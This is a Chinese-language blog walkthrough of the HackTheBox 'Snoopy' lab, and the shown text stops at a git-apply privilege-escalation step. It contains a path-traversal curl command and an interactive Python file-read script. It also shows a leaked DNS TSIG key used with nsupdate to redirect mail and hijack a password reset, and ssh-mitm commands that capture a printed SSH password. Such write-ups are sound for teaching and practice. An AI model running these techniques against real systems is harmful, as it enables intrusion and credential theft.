<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Snoopy - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Snoopy 10.10.11.212                                                                                                              端口扫描22，53，80: 1234567891011121">
<meta property="og:type" content="article">
<meta property="og:title" content="Snoopy - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Snoopy 10.10.11.212                                                                                                              端口扫描22，53，80: 1234567891011121">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050801.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050802.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050806.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050803.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050804.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050805.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050807.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050808.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050809.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050810.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050811.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050812.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050813.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050814.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050815.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050816.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050817.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050818.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050819.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050820.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050821.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050822.jpg">
<meta property="article:published_time" content="2023-05-09T01:35:02.000Z">
<meta property="article:modified_time" content="2023-09-25T06:43:07.459Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050801.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Snoopy - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Snoopy - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2023-05-09T01:35:02.000Z" itemprop="datePublished" class="page-time">
  2023-05-09
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#mail"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">mail</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#子域名扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">子域名扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#mm-snoopy-htb"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">mm.snoopy.htb</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LFI"><span class="post-toc-number">4.</span> <span class="post-toc-text">LFI</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#named-conf"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">named.conf</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lfi-py"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">lfi.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#DNS-to-mm"><span class="post-toc-number">5.</span> <span class="post-toc-text">DNS to mm</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#mm"><span class="post-toc-number">6.</span> <span class="post-toc-text">mm</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#server-provision"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">server_provision</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ssh-mitm"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">ssh-mitm</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#cbrown"><span class="post-toc-number">7.</span> <span class="post-toc-text">cbrown</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#git-apply"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">git apply</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tmp-diff"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">&#x2F;tmp&#x2F;diff</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">8.</span> <span class="post-toc-text">user flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">提权信息</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权-amp-root-flag"><span class="post-toc-number">9.</span> <span class="post-toc-text">提权 &amp; root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shadow"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">shadow</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#root-id-rsa"><span class="post-toc-number">9.2.</span> <span class="post-toc-text">root_id_rsa</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">10.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Snoopy-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Snoopy - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2023-05-09 09:35:02" datetime="2023-05-09T01:35:02.000Z"  itemprop="datePublished">2023-05-09</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://app.hackthebox.com/machines/Snoopy" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Snoopy</a></li>
<li>10.10.11.212</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050801.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22，53，80:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.212</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 16:06 CST</span><br><span class="line">Nmap scan report for 10.10.11.212</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)</span><br><span class="line">|_  256 545941e1719a1a879c1e995059bfe5ba (ED25519)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: SnoopySec Bootstrap Template - Index</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 59.82 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>链接里得到域名，加hosts：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.212 snoopy.htb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050802.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h2><p>contact里提到mail暂时离线：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050806.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>子域名发现mm:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://snoopy.htb/" -H 'Host: FUZZ.snoopy.htb' -fs 23418</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 200ms]</span><br><span class="line">    * FUZZ: mm</span><br></pre></td></tr></table></figure>

<h2 id="mm-snoopy-htb"><a href="#mm-snoopy-htb" class="headerlink" title="mm.snoopy.htb"></a>mm.snoopy.htb</h2><p>添加hosts后访问，是一个Mattermost：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050803.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>但没开外部注册</p>
<h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>回到主站，存在一个下载功能，简单测试发现存在LFI，基础双写绕过，下载下来是一个压缩包，解压得到读取内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_path="/etc/passwd"</span><br><span class="line">curl "http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//..../$file_path" -o output.zip</span><br><span class="line"></span><br><span class="line">unzip output.zip</span><br><span class="line">cat press_package/$file_path</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050804.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>后面就是一步步读文件,例如前面端口和主站都有提到dns，就可以读dns配置文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;bind&#x2F;named.conf</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050805.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="named-conf"><a href="#named-conf" class="headerlink" title="named.conf"></a>named.conf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// This is the primary configuration file for the BIND DNS server named.</span><br><span class="line">//</span><br><span class="line">// Please read /usr/share/doc/bind9/README.Debian.gz for information on the</span><br><span class="line">// structure of BIND configuration files in Debian, *BEFORE* you customize</span><br><span class="line">// this configuration file.</span><br><span class="line">//</span><br><span class="line">// If you are just adding zones, please do that in /etc/bind/named.conf.local</span><br><span class="line"></span><br><span class="line">include "/etc/bind/named.conf.options";</span><br><span class="line">include "/etc/bind/named.conf.local";</span><br><span class="line">include "/etc/bind/named.conf.default-zones";</span><br><span class="line"></span><br><span class="line">key "rndc-key" &#123;</span><br><span class="line">    algorithm hmac-sha256;</span><br><span class="line">    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="lfi-py"><a href="#lfi-py" class="headerlink" title="lfi.py"></a>lfi.py</h2><p>使用脚本完成自动解压，交互式读文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore, Style</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfi</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#cookies </span></span><br><span class="line">    </span><br><span class="line">        url =<span class="string">"http://snoopy.htb/download"</span></span><br><span class="line">        params = &#123;<span class="string">"file"</span>:<span class="string">f"....//....//....//....//....//....//....//....//....//....//....//..../<span class="subst">&#123;path&#125;</span>"</span>&#125;</span><br><span class="line">        r= requests.get(url,params=params)</span><br><span class="line">        <span class="keyword">if</span>(r.status_code == <span class="number">200</span>):</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'ejemplo.zip'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(r.content)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">with</span> zipfile.ZipFile(<span class="string">'ejemplo.zip'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">                zip_ref.extractall(<span class="string">'.'</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">f'press_package<span class="subst">&#123;path&#125;</span>'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">                print(Fore.GREEN + <span class="string">f"<span class="subst">&#123;content&#125;</span>"</span> + Style.RESET_ALL)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(Fore.RED + <span class="string">f"<span class="subst">&#123;path&#125;</span> not found."</span> + Style.RESET_ALL)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> zipfile.BadZipFile:</span><br><span class="line">        print(Fore.RED + <span class="string">f"<span class="subst">&#123;path&#125;</span> not found."</span> + Style.RESET_ALL)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(Fore.RED + <span class="string">f"LFI Error : <span class="subst">&#123;e&#125;</span>"</span> + Style.RESET_ALL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        path  = input(Fore.BLUE + <span class="string">"[+] file &gt;&gt; "</span> + Style.RESET_ALL)</span><br><span class="line">        lfi(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="DNS-to-mm"><a href="#DNS-to-mm" class="headerlink" title="DNS to mm"></a>DNS to mm</h1><p>前面知道mail离线，mm没开注册，找回密码提示发邮件应该是通过mail，那就尝试通过获得的secret添加dns记录：</p>
<ul>
<li>DNS Updates with nsupdate - Serverless Industries<br><a href="https://serverless.industries/2020/09/27/dns-nsupdate-howto.en.html" target="_blank" rel="noopener">https://serverless.industries/2020/09/27/dns-nsupdate-howto.en.html</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 本地开启smtp监听，用于后面接收邮件内容</span></span><br><span class="line">sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.13:25</span><br><span class="line"></span><br><span class="line">export HMAC="hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="</span><br><span class="line">nsupdate -y $HMAC</span><br><span class="line"></span><br><span class="line">server 10.10.11.212</span><br><span class="line">update add mail.snoopy.htb.   900  IN  A 10.10.14.13</span><br><span class="line">send</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050807.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>  然后去mm那里忘记密码发送找回邮件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sbrown@snoopy.htb</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 小坑，删除URL里的3D和=</span></span><br><span class="line">Reset Password http://mm.snoopy.htb/reset_password_complete?token=4f5x4ogxb7q1pgccrzh717kzkuyg9cq4ngt9z1xba4uuxze9tjo77spoyi5fzgya</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050808.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050809.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050810.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>重置成功，登录mm：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050811.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="mm"><a href="#mm" class="headerlink" title="mm"></a>mm</h1><p>mm里提供一些额外命令</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050812.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="server-provision"><a href="#server-provision" class="headerlink" title="server_provision"></a>server_provision</h2><p>看起来是操作服务器的：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050813.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>输入参数测试，有连接过来,根据banner知道用的是Paramiko进行的ssh连接：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050814.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050815.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ssh-mitm"><a href="#ssh-mitm" class="headerlink" title="ssh-mitm"></a>ssh-mitm</h2><p>因为直接nc没法完成模拟完整的ssh交互，所以使用这个：</p>
<ul>
<li>SSH-MITM - ssh audits made simple — SSH-MITM<br><a href="https://docs.ssh-mitm.at/" target="_blank" rel="noopener">https://docs.ssh-mitm.at/</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install ssh-mitm</span><br><span class="line"></span><br><span class="line">cbrown@snoopy.htb</span><br><span class="line"></span><br><span class="line">python3 -m sshmitm server --enable-trivial-auth --remote-host 10.10.11.212 --listen-port 2222</span><br></pre></td></tr></table></figure>

<p>remote设置成靶机ip，让mm那里连到我们的2222端口再转发到靶机的22端口，得到cbrown ssh账号密码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050816.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="cbrown"><a href="#cbrown" class="headerlink" title="cbrown"></a>cbrown</h1><p>cbrown ssh登录,下一步应该是要通过git到sbrown：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Remote Address: 10.10.11.212:22</span><br><span class="line">Username: cbrown</span><br><span class="line">Password: sn00pedcr3dential!!!</span><br><span class="line">Agent: no agent</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050817.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="git-apply"><a href="#git-apply" class="headerlink" title="git apply"></a>git apply</h2><p>这个命令是用来应用补丁的，可以通过补丁来修改文件，那就可以去修改sbrown的文件例如写一个公钥进去</p>
